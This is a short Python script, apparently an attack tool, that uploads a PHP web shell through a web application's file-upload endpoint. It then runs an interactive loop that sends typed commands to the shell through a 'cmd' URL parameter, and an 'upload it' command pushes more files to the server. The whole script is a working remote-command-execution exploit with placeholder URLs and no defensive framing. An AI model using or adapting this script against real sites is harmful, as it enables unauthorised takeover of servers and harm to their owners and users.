import requests

url="http://example.com/upload" #insert link here

#headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary5tBS5SLzak42PAxi'}
path_to_shell=""
with open(path_to_shell,'rb') as f:
    files={'file':f} #check the params first and confirm that this is alright.
    r=requests.post(url, files=files)

while True:
    cmd=input('enter command: ') 
    link=f"http://example.com/images/nameofshell.php?cmd={cmd}" #replace this line accordingly.
    if "upload it" in cmd:
        cmd=cmd.split()
        with open(cmd[2],'rb') as f:
            files={'file':f}
            r=requests.post(url, files=files)
            print(r.text)
            continue
    r=requests.get(link)
